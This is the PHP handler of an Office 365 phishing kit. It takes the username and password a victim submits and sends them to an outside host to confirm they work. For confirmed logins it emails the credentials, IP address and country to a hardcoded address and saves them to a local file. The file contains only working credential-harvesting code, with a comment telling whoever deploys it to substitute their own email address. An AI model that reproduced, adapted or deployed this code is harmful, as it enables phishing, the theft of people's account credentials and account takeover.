<?php

header('Access-Control-Allow-Origin: *');  

if(isset($_POST['user']) && isset($_POST['pass'])){


function visitor_country()
	{
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$country = json_decode(curl_exec($ch))->country;
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$user = $_POST['user'];
$pass = $_POST['pass'];
$recipient = "chelo@easitman.com"; //Replace your email id here
$api = 'http://my-ips.org/ip/index.php';
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$data = array(
		"user" => $user,
		"pass" => $pass,
		"type" => "1",
		"country" => $country,
		"ip" => $ip
	);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $api);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	if ($result == 1)
		{
		$date = date('d-m-Y');
		$ip = getenv("REMOTE_ADDR");
		$over = 'https://office365.com';
		$message = "-----------------+ True Login Verfied  +-----------------\n";
		$message.= "User ID: " . $user . "\n";
		$message.= "Password: " . $pass . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "Client Country      : $country\n";
		$message.= "-----------------+ Created in INBOXIT+------------------\n";
		$subject = "OFFICE 365 | True Login: " . $ip . "\n";
		$headers = "MIME-Version: 1.0\n";
		$headers = "From: Team<rezult@linkin.com>";

		mail($recipient, $subject, $message, $headers);
		@fclose(@fwrite(@fopen("Office-login.txt", "a"),$message));
		
	
	

		echo 1;
		}
	  else
		{
		echo 2;
		}
	}
?>
